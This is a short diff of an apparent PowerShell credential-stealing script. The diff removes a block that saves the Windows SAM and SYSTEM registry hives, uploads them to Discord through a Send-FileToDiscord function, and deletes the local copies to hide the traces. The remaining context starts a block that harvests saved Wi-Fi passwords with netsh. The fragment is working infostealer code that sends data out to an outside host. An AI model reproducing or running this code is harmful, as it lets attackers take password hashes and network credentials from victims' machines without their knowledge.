@@ -39,19 +39,6 @@ function Send-FileToDiscord {
     }
 }
 
-# Extract SAM and SYSTEM Registry Hives
-try {
-    reg save HKLM\SAM sam /y
-    reg save HKLM\SYSTEM system /y
-    Send-FileToDiscord -filePath ".\sam" -fileName "SAM"
-    Send-FileToDiscord -filePath ".\system" -fileName "SYSTEM"
-    Remove-Item ".\sam", ".\system" -Force
-    Send-PayloadToDiscord -content "SAM and SYSTEM registry hives saved and uploaded."
-} catch {
-    Write-Host "Error handling SAM or SYSTEM: $_"
-    Send-PayloadToDiscord -content "Error handling SAM or SYSTEM: $_"
-}
-
 # Extract Wi-Fi Credentials
 try {
     $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
